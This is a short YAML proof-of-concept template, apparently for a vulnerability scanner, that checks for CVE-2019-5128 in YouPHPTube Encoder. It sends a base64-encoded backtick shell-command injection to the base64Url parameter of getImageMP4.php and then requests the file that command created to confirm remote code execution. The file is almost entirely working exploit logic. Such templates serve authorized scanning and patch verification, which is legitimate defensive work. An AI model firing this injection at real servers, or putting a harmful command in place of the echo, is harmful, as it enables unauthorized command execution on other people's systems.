name: poc-yaml-youphptube-encoder-cve-2019-5128
set:
  r1: randomInt(800000000, 1000000000)
  r2: base64("`echo "+ string(r1) +" > "+ string(r1) +".txt`")
rules:
  - method: GET
    path: /objects/getImageMP4.php?base64Url={{r2}}&format=jpg
    follow_redirects: true
    expression: |
      response.status==200
  - method: GET
    path: /objects/{{r1}}.txt
    follow_redirects: true
    expression: |
      response.status==200 && response.body.bcontains(bytes(string(r1)))
detail:
  author: 0x_zmz(github.com/0x_zmz)
  links:
    - https://xz.aliyun.com/t/6708